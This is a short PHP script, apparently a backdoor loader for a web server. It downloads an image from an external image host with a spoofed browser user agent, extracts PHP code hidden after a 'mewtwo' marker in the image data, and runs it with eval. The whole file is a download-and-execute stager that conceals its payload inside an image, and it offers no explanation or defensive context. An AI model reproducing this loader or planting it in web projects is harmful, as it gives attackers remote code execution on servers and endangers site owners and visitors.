<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://i.ibb.co/2nNc7px/img-66ff57-png.webp");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
$img = curl_exec($ch);
curl_close($ch);
$x = explode("mewtwo", $img);
if (isset($x[1])) {
    eval("?>" . $x[1]);
} else {
    echo "Can't found in the image content.";
}
